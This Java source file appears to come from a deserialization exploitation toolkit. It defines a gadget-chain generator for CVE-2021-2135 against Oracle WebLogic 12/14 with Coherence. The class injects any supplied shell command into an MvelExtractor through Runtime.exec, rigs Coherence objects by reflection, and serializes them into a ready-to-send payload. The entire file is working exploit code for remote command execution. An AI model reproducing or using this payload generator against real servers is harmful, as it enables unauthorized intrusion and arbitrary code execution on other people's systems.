package sonomon.jndi.deser.gadgets;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.internal.util.SimpleBinaryEntry;
import com.tangosol.io.DefaultSerializer;
import com.tangosol.io.Serializer;
import com.tangosol.util.*;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.filter.MapEventFilter;
import com.tangosol.util.processor.ConditionalPutAll;
import java.io.*;
import java.lang.reflect.Method;
import java.util.AbstractMap;
import java.util.Map;
import java.util.Map.Entry;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class CVE_2021_2135 implements SerializeObject{
	//依赖coherence,因此只能weblogic12/14
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		
		payload = "java.lang.Runtime.getRuntime().exec(\""+payload+"\");return new Integer(1);";
        MvelExtractor extractor1 = new MvelExtractor(payload);
        MvelExtractor extractor2 = new MvelExtractor("");

        AttributeHolder attributeHolder = new AttributeHolder();

        SortedBag partialResult = new TopNAggregator.PartialResult(extractor2, 2);
        partialResult.add(1);
        Deserialize.setFieldValue(partialResult, "m_comparator", extractor1);

        ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream1 = new DataOutputStream(baos1);
        ExternalizableHelper.writeObject(dataOutputStream1, partialResult);

        ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream2 = new DataOutputStream(baos2);
        ExternalizableHelper.writeObject(dataOutputStream2, new Integer(0));

        Binary key = new Binary(baos1);
        Binary value = new Binary(baos2);
        SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(key,value);
        Serializer m_serializer= new DefaultSerializer(SimpleBinaryEntry.class.getClassLoader());
        simpleBinaryEntry.setContextSerializer(m_serializer);

        LiteMap liteMap = new LiteMap();
        liteMap.put(simpleBinaryEntry,1);
        byte bt = 3;
        Map.Entry[] arrayOfEntry1 = new Map.Entry[8];
        Map.Entry entry = (Entry) Deserialize.getFieldValue(liteMap, "m_oContents").get(liteMap);
        arrayOfEntry1[0] = entry;
        arrayOfEntry1[1] = new AbstractMap.SimpleEntry(new XString(null), 2);
        Deserialize.setFieldValue(liteMap, "m_nImpl", bt);
        Deserialize.setFieldValue(liteMap, "m_oContents", arrayOfEntry1);
        
        ConditionalPutAll conditionalPutAll = new ConditionalPutAll(new MapEventFilter(), new LiteMap());
        Deserialize.setFieldValue(conditionalPutAll, "m_map", liteMap);

        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder, conditionalPutAll); 
        
        return attributeHolder;


    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}


}